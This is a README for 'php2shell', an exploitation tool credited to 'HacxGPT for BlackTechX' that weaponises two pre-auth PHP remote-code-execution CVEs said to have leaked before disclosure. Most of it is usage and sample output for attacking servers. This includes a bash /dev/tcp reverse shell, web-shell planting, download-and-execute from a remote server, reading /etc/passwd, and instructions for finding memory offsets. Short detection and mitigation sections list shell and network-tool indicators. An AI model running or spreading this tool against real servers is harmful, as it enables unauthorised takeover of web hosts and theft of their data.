# php2shell - CVE-2026-109618 / CVE-2026-109619 Exploitation Tool

> **Critical Advisory (CVSS v4.0: 9.2 - Critical):** This tool exploits two pre-auth Remote Code Execution (RCE) flaws in the PHP core that leaked online ahead of coordinated disclosure. Exploitation allows arbitrary command execution straight from the web server.

**Developed by:** HacxGPT for BlackTechX  
**Original PoC by:** [eness](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC)  
**Conversion:** PoC to fully functional exploitation tool

---

## ⚠️ WARNING

This tool is for **educational purposes only** and should only be used in environments you own or have explicit permission to test. Unauthorized use against systems you do not own is illegal.

---

## 🎯 Features

- **Fully Automated Exploitation:** One-click RCE against vulnerable PHP servers
- **Multiple Payload Types:**
  - Custom command execution
  - Reverse shell generation
  - Web shell deployment
  - Download and execute from URL
- **Smart Target Detection:** Automatically detects PHP version and server type
- **Profile Support:** Pre-configured offsets for different PHP builds
- **Interactive Mode:** Easy-to-use interactive interface
- **File-based Execution:** Handles commands longer than the inline limit
- **Verification:** Proof-of-exploitation checking

---

## 📋 Requirements

- Python 3.7+
- `requests` library (optional, for some features)

```bash
pip install requests
```

---

## 🚀 Usage

### Basic Command Execution

```bash
python3 php2shell_exploit.py -u http://target.com/index.php -c "id"
```

### Reverse Shell

```bash
# Listen on your machine first
nc -lvnp 4444

# Then run the exploit
python3 php2shell_exploit.py -u http://target.com/index.php --reverse-shell 10.0.0.1:4444
```

### Web Shell Deployment

```bash
python3 php2shell_exploit.py -u http://target.com/index.php --web-shell
# Access at: http://target.com/shell.php?cmd=id
```

### Download and Execute

```bash
python3 php2shell_exploit.py -u http://target.com/index.php --download-execute http://yourserver.com/payload.sh
```

### Custom Profile

```bash
python3 php2shell_exploit.py -u http://target.com/index.php -c "id" \
    --profile lab \
    --zif-offset 0x43A870 \
    --dtor-offset 0x613C50
```

### Interactive Mode

```bash
python3 php2shell_exploit.py --interactive
```

---

## 🎯 Target Requirements

The exploit targets PHP servers with the following conditions:

### Vulnerable PHP Versions

| PHP Branch | Status | Vulnerable Versions | Fixed Version |
|------------|--------|---------------------|---------------|
| PHP 8.5 | Supported | < 8.5.12 | 8.5.12+ |
| PHP 8.4 | Supported | < 8.4.27 | 8.4.27+ |
| PHP 8.3 | Supported | < 8.3.36 | 8.3.36+ |
| PHP 8.2 | Supported | < 8.2.35 | 8.2.35+ |
| PHP 8.1 | EOL | All versions | **No patch** |
| PHP 8.0 | EOL | All versions | **No patch** |
| PHP 7.x | EOL | All versions | **No patch** |
| PHP 5.x | EOL | All versions | **No patch** |

### Configuration Requirements

- `display_errors = 1`
- `memory_limit = 8M` (or lower than the OOM payload size)
- `max_input_vars = 1000`
- `session.use_cookies = 1`
- `session.use_strict_mode = 0`
- `session.upload_progress.enabled = 1` (default)
- Single-worker / prefork process model

---

## 🔧 Supported Profiles

| Profile | Description | Default Offsets |
|---------|-------------|----------------|
| `bookworm` | Official Docker image `php:8.4.26-apache` (Debian 12) | zif: 0x43A870, dtor: 0x613C50 |
| `lab` | Custom Apache 2.4.68 builds | zif: 0x43A870, dtor: 0x613C50 |
| `ubuntu` | Ubuntu-based builds | zif: 0x43A870, dtor: 0x613C50 |

---

## 📊 Exploitation Stages

The exploit consists of four sequential stages:

### Stage 0: HTTP Worker Rotation
- Aborts the current prefork worker over HTTP
- Ensures a clean heap state in the newly spawned worker

### Stage 1: Heap Base Leak
- Induces an OOM condition via oversized multipart field
- Triggers uninitialized memory leakage through `Set-Cookie: PHPSESSID`
- Extracts the Zend MM 2MB-aligned chunk base

### Stage 2: Libphp Base Leak
- Exploits session serialization / HashTable allocation alignment
- Leaks the `ZVAL_PTR_DTOR` function pointer via `Set-Cookie`
- Computes the base address of `libphp.so`

### Stage 3: Fake Reference & Arbitrary Execution
- Forges a fake `HashTable` structure inside a 167-byte `zend_string`
- Crafted reference overwrites `PS(http_session_vars)`
- When PHP frees the session data, `zif_system` executes the supplied command

---

## 🎯 Command Line Options

### Target Specification
```
-u, --url TEXT           Target PHP page URL (required)
-c, --cmd TEXT           Command to execute (default: "id")
```

### Payload Types
```
--reverse-shell TEXT     Create a reverse shell (LHOST:LPORT)
--web-shell              Deploy a web shell
--download-execute TEXT  Download and execute from URL
```

### Exploitation Options
```
--profile TEXT           Target build profile: bookworm, lab, ubuntu
--zif-offset TEXT        Offset of zif_system in libphp.so
--dtor-offset TEXT       Offset of ZVAL_PTR_DTOR in libphp.so
--htdata-offset TEXT     Chunk-relative offset of the 167-byte live string
--huge-mb INTEGER        Size of OOM field in MB (default: 12)
--timeout FLOAT          Per-request timeout (default: 30.0)
--retries INTEGER        Attempts per leak stage (default: 3)
--skip-check             Skip vulnerability check
--no-pre-rotate          Skip initial worker rotation
--no-retry-rotate        Do not rotate between failed stage attempts
```

### Verification
```
--proof-file TEXT        Path to local proof file to check
--fetch TEXT             HTTP path to GET after exploitation
```

### Output
```
-q, --quiet              Suppress verbose output
--interactive            Run in interactive mode
```

---

## 🔍 Detection & Monitoring

### Behavioral Indicators

Monitor and alert on PHP worker processes executing:
- **Interactive Shells:** `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`
- **Script Interpreters:** `python`, `perl`
- **Network Utilities:** `curl`, `wget`, `nc`, `certutil.exe`
- **Reverse Shell Patterns:** `/dev/tcp/`, `fsockopen`, `mkfifo`
- **Reconnaissance Commands:** `whoami`, `id`, `uname -a`, `ipconfig`

### Mitigation

To protect your systems:

1. **Immediate Mitigation:**
   ```ini
   session.upload_progress.enabled = Off
   ```

2. **Upgrade PHP:**
   - PHP 8.5: Upgrade to 8.5.12+
   - PHP 8.4: Upgrade to 8.4.27+
   - PHP 8.3: Upgrade to 8.3.36+
   - PHP 8.2: Upgrade to 8.2.35+

3. **For EOL Versions:**
   - Apply the source patch from the original repository
   - Use configuration mitigation
   - Isolate vulnerable systems

---

## 📝 Examples

### Example 1: Basic Exploitation
```bash
$ python3 php2shell_exploit.py -u http://192.168.1.100/index.php -c "id"
[*] Starting exploitation against 192.168.1.100:80/index.php
[*] Command: id
[*] Checking target vulnerability...
[*] PHP version detected: 8.2.34
[+] Target appears VULNERABLE (PHP 8.2 < 8.2.35)
[*] Server detected: Apache/2.4.68
[*] Stage 1: Heap leak (attempt 1/3)
[+] Chunk base = 0x7f8a1c000000
[*] Stage 2: Libphp leak (attempt 1/3)
[+] Libphp base = 0x7f8a1e234000
[*] Stage 3: HTDATA=0x7f8a1e234000 ZIF=0x7f8a1e67e870
[+] Exploitation successful!
```

### Example 2: Reverse Shell
```bash
# On attacker machine
$ nc -lvnp 4444

# Run exploit
$ python3 php2shell_exploit.py -u http://192.168.1.100/index.php --reverse-shell 10.0.0.1:4444
[*] Reverse shell payload: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
[+] Exploitation successful!

# Connection received on netcat
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Example 3: Web Shell
```bash
$ python3 php2shell_exploit.py -u http://192.168.1.100/index.php --web-shell
[+] Web shell payload generated
[+] Exploitation successful!

# Access the web shell
$ curl http://192.168.1.100/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Example 4: Interactive Mode
```bash
$ python3 php2shell_exploit.py --interactive

================================================================================
INTERACTIVE MODE
================================================================================

[>] Enter target URL (or 'quit' to exit): http://192.168.1.100/index.php
[*] Checking target vulnerability...
[+] Target appears VULNERABLE

[>] Select payload type:
    1. Custom command
    2. Reverse shell
    3. Web shell
    4. Download and execute
[>] Choice: 1
[>] Enter command: cat /etc/passwd
[+] Exploitation successful!
```

---

## 🛠️ Custom Offsets

If the default offsets don't work for your target, you can:

1. **Use Docker to extract offsets:**
   ```bash
   docker run --name php2shell-target -d php:8.4.26-apache
   python3 docker/offsets.py php2shell-target offsets.env
   python3 php2shell_exploit.py -u http://localhost:8080/index.php -c "id" --offsets-file offsets.env
   ```

2. **Manually specify offsets:**
   ```bash
   python3 php2shell_exploit.py -u http://target.com/index.php -c "id" \
       --zif-offset 0x43A870 \
       --dtor-offset 0x613C50 \
       --htdata-offset 0x6E0D8
   ```

3. **Find offsets using gdb:**
   ```bash
   gdb -p $(pidof php-fpm)
   (gdb) info proc mappings
   (gdb) p/x zif_system
   (gdb) p/x ZVAL_PTR_DTOR
   ```

---

## 📊 Limitations

1. **Command Length:** Inline commands are limited to 14 bytes due to the 167-byte carrier constraint
2. **Memory Limits:** Target must have `memory_limit` lower than the OOM payload size (default 12MB)
3. **Process Model:** Works best with prefork/single-worker models
4. **Configuration:** Requires specific PHP configuration settings (see above)

For longer commands, use the file-based execution approach or chain commands:
```bash
# Instead of a long command, write to a file first
python3 php2shell_exploit.py -u http://target.com/index.php -c "echo 'long command' > /tmp/cmd.sh"
python3 php2shell_exploit.py -u http://target.com/index.php -c "bash /tmp/cmd.sh"
```

---

## 🔄 Changelog

### Version 1.0 (Current)
- Converted from PoC to fully functional exploitation tool
- Added multiple payload types (reverse shell, web shell, etc.)
- Added interactive mode
- Added target detection and vulnerability checking
- Added profile support for different PHP builds
- Improved error handling and user feedback
- Added comprehensive documentation

---

## 📄 License

This tool is provided for educational purposes only. Use at your own risk.

---

## 🙏 Credits

- **Original PoC:** [eness](https://github.com/eness) - [php2shell-CVE-2026-109618-CVE-2026-109619-PoC](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC)
- **Tool Development:** HacxGPT for BlackTechX
- **Security Research:** watchTowr, Huntress, Florian Roth

---

## 📞 Contact

For questions or issues with this tool, refer to the original repository or open an issue.

**Original Repository:** [https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC)

---

*This tool is for authorized security testing only. Always obtain proper authorization before testing any system.*
